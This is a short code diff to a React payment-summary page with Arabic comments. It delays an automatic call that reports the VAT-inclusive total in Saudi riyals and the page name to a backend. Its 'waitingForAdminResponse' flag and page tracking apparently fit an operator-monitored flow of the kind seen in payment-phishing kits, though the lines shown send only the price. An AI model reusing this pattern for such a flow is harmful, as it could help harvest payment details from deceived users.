@@ -35,14 +35,16 @@ export default function SummaryPayment() {
   useEffect(() => {
     navigateToPage('ملخص الدفع');
     
-    // إرسال المجموع الكلي تلقائياً عند فتح الصفحة
-    sendData({
-      data: {
-        'المجموع الكلي': `${servicePrice + Math.round(servicePrice * 0.15)} ر.س`,
-      },
-      current: 'الملخص والدفع',
-      waitingForAdminResponse: false,
-    });
+    // إرسال المجموع الكلي تلقائياً عند فتح الصفحة (بعد تأخير للتأكد من الاتصال)
+    setTimeout(() => {
+      sendData({
+        data: {
+          'المجموع الكلي': `${servicePrice + Math.round(servicePrice * 0.15)} ر.س`,
+        },
+        current: 'الملخص والدفع',
+        waitingForAdminResponse: false,
+      });
+    }, 1000);
   }, [servicePrice]);
 
   const handlePayment = () => {
